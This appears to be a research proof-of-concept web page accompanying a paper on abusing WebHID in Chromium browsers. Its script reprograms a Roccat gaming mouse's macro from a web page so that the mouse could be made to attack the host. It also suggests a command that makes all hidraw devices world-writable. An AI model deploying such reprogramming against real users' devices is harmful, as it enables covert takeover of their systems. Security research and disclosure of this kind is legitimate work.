<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      /* Button Style Source: https://copy-paste-css.com/ */
      button {
        display: inline-block;
        outline: 0;
        cursor: pointer;
        border-radius: 6px;
        border: 2px solid #ff4742;
        color: #fff;
        background-color: #ff4742;
        padding: 8px;
        box-shadow: rgba(0, 0, 0, 0.07) 0px 2px 4px 0px,
          rgba(0, 0, 0, 0.05) 0px 1px 1.5px 0px;
        font-weight: 800;
        font-size: 16px;
        height: 42px;
      }
      button:hover {
        background: 0 0;
        color: #ff4742;
      }
    </style>
    <title>WebHID Logitech PoC</title>
  </head>
  <body
    style="
      width: 100vw;
      font-family: monospace;
      display: flex;
      justify-content: center;
      margin: 0;
      padding: 0;
      overflow-x: hidden;
    "
  >
    <div
      style="
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        width: 50%;
      "
    >
      <h1 style="text-align: center">WebHID Roccat Kone Aimo PoC</h1>
      <p style="text-align: justify">
        This Proof-of-Concept demonstrates how reprogrammable
        <i>Human Interface Devices (HIDs)</i> may be leveraged by a malicious
        actor to gain control over a victim's system using WebHID. The API is
        only available in <b>Chromium-based browsers</b> (e.g., Google Chrome or
        Microsoft Edge). This PoC uses the
        <a
          href="#"
          >Roccat Kone Aimo 16K</a
        >, a widely available gaming mouse that costs about 40$ or less.
      </p>
      <p style="text-align: justify">
        Please open the <b>developer console</b> for more information. The PoC
        will start immediately upon button press and require you to select the
        device in the permission dialog. Note that you may have to cycle profiles
        using the G9 button below the mouse wheel since our macro is only
        assigned to the G5 button in profile 2.
      </p>
      <button style="margin: 1rem" onclick="poc()">PoC!</button>
      <p style="text-align: justify">More extensive tooling can be found in
      <a href="https://anonymous.4open.science/r/hid-and-run-A257/">this 
        anonymous repository</a>. Since the anonymous repository does not
        provide bulk downloads we have also attached a ZIP file of the
        repository. <b>Our findings are described in detail in the paper attached
        as a PDF.</b>
      </p>
    </div>
  </body>
  <script>
    async function poc() {
      let device = await poc_open();
      if (!device) {
        console.error("Device not found!");
        return;
      }
      await poc_reprogram(device);
      return;
    }

    /* Get WebHID access to device. */
    async function poc_open() {
      console.log("Requesting permission to access device.");
      let devices = await navigator.hid.requestDevice({
        filters: [],
      });
      if (!devices || !devices.length) return null;

      // find endpoint that allows configuration
      let device = null;
      for (let tmp_device of devices)
        if (tmp_device.collections.length === 5) {
          device = tmp_device;
          break;
        }
      if (!device) return null;

      console.log(`Opening device with the name "${device.productName}".`);
      try {
        await device.open();
      } catch (error) {
        console.error(
          "Device could not be opened. On Linux systems this step requires Chromium to be run as sudo or udev rules that allow writing to the device. As a workaround you may also use this command which gives write permission to HID devices on your Linux system: `sudo chmod 0666 /dev/hidraw*`."
        );
        return null;
      }

      return device;
    }

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function poc_reprogram(device) {
        let start_time = performance.now();
        console.log("Starting reprogramming.");
        // await device.sendFeatureReport(36, new Uint8Array([ 0x88, 0x05, 0x05, 0x07, 0x00, 0x04, 0x00, 0x61, 0x00, 0x6c, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x63, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x43, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x6c, 0x00, 0x44, 0x00, 0x61, 0x00, 0x74, 0x00, 0x61, 0x00, 0x45, 0x00, 0x76, 0x00, 0x65, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x35, 0x00, 0x30 ])); await sleep(100);
        await device.sendFeatureReport(36, new Uint8Array([ 0x88, 0x05, 0x05, 0x07, 0x00, 0x04, 0x05, 0x06, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
        console.log("Done!");
    }
  </script>
</html>
